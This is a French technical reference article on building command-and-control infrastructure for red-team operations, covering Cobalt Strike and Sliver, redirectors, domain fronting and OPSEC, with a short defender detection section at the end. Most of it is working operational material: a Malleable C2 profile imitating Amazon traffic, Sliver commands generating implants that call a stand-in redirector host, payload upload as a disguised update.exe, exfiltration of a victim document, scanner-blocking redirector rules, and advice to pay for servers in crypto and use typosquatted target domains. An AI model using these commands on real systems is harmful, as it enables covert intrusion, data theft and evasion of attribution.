---
title: C2 Infrastructure
domain: sciences-appliquées
subdomain: informatique / sécurité
tags: [c2, command-and-control, cobalt-strike, sliver, redirectors, domain-fronting, pentest, red-team]
date: 2026-03-22
---

# C2 Infrastructure

L'infrastructure de Command & Control (C2) permet aux red teams et attaquants de maintenir la communication avec les agents déployés sur des systèmes compromis. Une infrastructure robuste protège l'opérateur, assure la persistance des communications, et contourne les défenses réseau.

## Architecture C2 — Principes

```
Architecture de base :

  Opérateur → Team Server C2 → Redirecteur(s) → Agent (victim)

Composants :
  Team Server : serveur central exécutant le framework C2
                → Jamais exposé directement à internet (protéger l'IP)
  Redirecteur  : proxy entre la victime et le team server
                → IP publique exposée dans les beacons
                → Si brûlé, l'opérateur peut en déployer un nouveau
  Agent/Beacon : payload déployé sur la victime
                → Communicate via HTTP/HTTPS/DNS/SMB vers le redirecteur

Protocoles de communication C2 :
  HTTP/HTTPS   : le plus courant, se fond dans le trafic légitime
  DNS          : très furtif, difficile à bloquer (tunnel DNS)
  SMB          : communication inter-agents (lateral movement)
  ICMP         : passe souvent les firewalls permissifs
  Slack/Teams  : C2 via APIs SaaS (très difficile à détecter)
```

## Frameworks C2 principaux

### Cobalt Strike

```
Cobalt Strike — framework commercial de référence pour le red teaming
  Beacon : agent C2 de Cobalt Strike
  Malleable C2 profiles : configuration du trafic réseau pour imiter du légitime
  Aggressor Script : automatisation des tâches C2

Malleable C2 Profile — personalisation du trafic beacon :
  Imiter du trafic légitime (Amazon, Google, Salesforce...)
  Modifier les URIs, headers HTTP, encoding des données
```

```bash
# Exemple de Malleable C2 Profile (imiter Amazon)
# Fichier : amazon.profile

set sleeptime "5000";    # 5s entre les check-ins
set jitter "20";         # 20% de variabilité
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";

http-get {
    set uri "/s/ref=nb_sb_noss_1/";

    client {
        header "Accept" "*/*";
        header "Host" "www.amazon.com";

        metadata {
            base64url;
            parameter "field-keywords";
        }
    }

    server {
        header "Content-Type" "text/html";
        header "Connection" "keep-alive";

        output {
            base64url;
            print;
        }
    }
}

# Lancer Cobalt Strike team server
./teamserver 192.168.1.100 Password123 amazon.profile

# Générer un beacon HTTPS
# Dans le client Cobalt Strike → Payloads → HTTPS Beacon → ...
```

### Sliver (open-source)

```bash
# Sliver — framework C2 open-source (BishopFox)
# Supporte : mTLS, WireGuard, HTTP/S, DNS

# Installation
curl https://sliver.sh/install | sudo bash

# Lancer le serveur Sliver
sliver-server

# Dans la console Sliver
# Générer un implant HTTPS
generate --http https://REDIRECTEUR.COM:443 --os windows --arch amd64 --name beacon

# Générer un implant DNS
generate --dns c2.maildomain.com --os linux --name dns-beacon

# Lancer un listener HTTP
http --lhost 0.0.0.0 --lport 8080

# Sessions actives
sessions
use SESSION_ID

# Commandes sur l'implant
whoami
ps
upload /tmp/payload.exe C:\Windows\Temp\update.exe
download C:\Users\Admin\Documents\secret.docx /tmp/
execute-assembly Rubeus.exe dump
```

### Autres frameworks notables

```
Mythic (open-source) :
  Architecture modulaire — agents et protocoles sous forme de plugins
  Agents : Apollo (.NET), Poseidon (Go), Medusa (Python)...

Havoc (open-source) :
  Alternative moderne à Cobalt Strike
  Demon : agent principal (reflective DLL)

Brute Ratel C4 (commercial) :
  Connu pour l'évasion EDR avancée
  Très utilisé par des groupes APT (Sandworm, etc.)

Covenant (.NET) :
  Grunts : agents .NET
  Interface web
```

## Redirecteurs

### Apache/Nginx comme redirecteur HTTP

```bash
# Nginx — redirecteur simple (proxy_pass vers le team server)
# /etc/nginx/sites-available/redirector.conf

server {
    listen 443 ssl;
    server_name redirecteur.com;

    ssl_certificate /etc/letsencrypt/live/redirecteur.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/redirecteur.com/privkey.pem;

    # Rediriger seulement les URIs légitimes C2
    location ~ ^/s/ref= {
        proxy_pass https://TEAMSERVER_IP:443;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $remote_addr;
    }

    # Tout le reste → page web normale (leurre)
    location / {
        root /var/www/html;
        try_files $uri /index.html;
    }
}
```

```bash
# Apache — mod_rewrite comme redirecteur conditionnel
# .htaccess ou VirtualHost

RewriteEngine On

# Rediriger si User-Agent correspond au beacon
RewriteCond %{HTTP_USER_AGENT} "Mozilla/5.0 .Windows NT 10.0" [NC]
RewriteCond %{REQUEST_URI} "^/s/ref=" [NC]
RewriteRule ^(.*)$ https://TEAMSERVER_IP/$1 [P,L]

# Bloquer les scanners (Shodan, VirusTotal)
RewriteCond %{HTTP_USER_AGENT} "Shodan|censys|nmap|masscan" [NC]
RewriteRule .* - [F,L]

# Tout le reste → site leurre
RewriteRule ^(.*)$ https://legitimate-site.com/$1 [R=302,L]
```

### Redirecteurs DNS

```bash
# Socat — redirecteur TCP/UDP simple
socat TCP-LISTEN:443,fork,reuseaddr TCP:TEAMSERVER_IP:443 &
socat UDP-LISTEN:53,fork,reuseaddr UDP:TEAMSERVER_IP:53 &

# iptables — redirection de port (transparent)
iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination TEAMSERVER_IP:443
iptables -t nat -A POSTROUTING -j MASQUERADE
echo 1 > /proc/sys/net/ipv4/ip_forward

# Cloudflare Worker — redirecteur serverless (domain fronting moderne)
# Déployer un worker qui proxy vers le team server
```

## Domain Fronting

```
Domain Fronting — technique pour masquer la vraie destination des requêtes C2 :
  Exploite les CDNs (Cloudflare, AWS CloudFront, Azure CDN)
  La connexion TLS montre le domaine légitime du CDN
  → Le trafic semble aller vers google.com, aws.amazon.com, etc.
  → Difficile à bloquer sans bloquer tout le CDN

Fonctionnement avec Cloudflare :
  1. Le beacon se connecte à Cloudflare (IP Cloudflare)
  2. SNI = domaine légitime derrière Cloudflare (ex: victim-sees-google.com)
  3. Header Host = votre domaine C2 derrière Cloudflare
  → Cloudflare route vers votre domaine

Note : Cloudflare et AWS ont en grande partie bloqué le domain fronting
       → Des alternatives existent (Cloudflare Workers, Azure CDN, censys domains)
```

```
Catégories de domaines pour C2 :
  Domaines récents → suspects → préférer des domaines avec historique
  Domaines catégorisés : finance, IT, SaaS → moins filtrés que "inconnu"
  Techniques :
    - Aged domains (domaines expirés avec historique légitime)
    - Typosquatting de domaines légitimes
    - Domaines avec certificats Let's Encrypt valides
    - Domaines correspondant à la cible (ex: target-updates.com)
```

## Operational Security (OPSEC)

```
OPSEC C2 — minimiser les traces détectables :

Séparation des rôles :
  ✓ Un redirecteur par campagne (rotation si brûlé)
  ✓ Team server jamais exposé directement
  ✓ Infrastructure différente pour chaque client/engagement

Trafic :
  ✓ Malleable profiles imitant du trafic légitime réel (analyser pcap d'applications cibles)
  ✓ Jitter + sleep time réalistes (pas de beacon toutes les 60s exactement)
  ✓ Pas de communication aux heures creuses (adapter aux horaires bureau cibles)
  ✓ Chiffrement de bout en bout (TLS avec certificat valide)

Infrastructure :
  ✓ Payer les serveurs avec de la crypto (traçabilité réduite)
  ✓ VPS dans des juridictions favorables
  ✓ Compartimenter : phishing infra ≠ C2 infra ≠ exfil infra
  ✓ Détruire l'infrastructure à la fin de l'engagement

Contre-détection :
  ✓ Analyser son propre trafic C2 avec Wireshark avant déploiement
  ✓ Scanner son redirecteur avec des outils de threat intel (Shodan, Censys)
  ✓ Vérifier que les headers HTTP du redirecteur ne révèlent pas le framework
  ✓ Désactiver les ports et services inutiles sur les redirecteurs
```

## Détection côté défenseur

```
Indicateurs de C2 :
  Trafic réseau :
    → Beaconing régulier vers une IP externe (intervalles constants)
    → DNS queries inhabituelles (longues, haute entropie, sous-domaines aléatoires)
    → Connexions HTTPS vers des domaines récents sans réputation
    → Gros volumes de données sortantes (exfiltration)

  Système :
    → Processus injectant dans d'autres processus (svchost, explorer, etc.)
    → Connexions réseau depuis des processus inattendus (Word.exe → HTTPS)
    → Tâches planifiées/WMI subscriptions nouvelles

  Outils de détection :
    → JA3/JA3S fingerprinting : identifier les clients TLS (Cobalt Strike a des JA3 connus)
    → RITA (Real Intelligence Threat Analytics) : détection du beaconing DNS/HTTP
    → Zeek + suricata : analyse du trafic réseau
    → EDR : hooks sur les API Windows d'injection mémoire

Règles Sigma pour la détection de C2 courants :
  → Sigma rules disponibles dans le repo SigmaHQ pour Cobalt Strike, Sliver, etc.
```
